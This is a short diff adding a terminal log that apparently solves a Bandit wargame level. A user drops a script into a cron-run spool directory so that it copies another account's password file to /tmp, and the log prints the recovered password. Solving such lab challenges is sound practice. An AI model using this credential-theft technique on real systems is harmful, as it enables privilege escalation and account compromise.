@@ -1,0 +1,5 @@
+bandit23@bandit:/tmp/bandit23$ cat new.sh
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24.pass
+bandit23@bandit:/tmp/bandit23$ cp new.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/bandit23$ cat /tmp/bandit24.pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
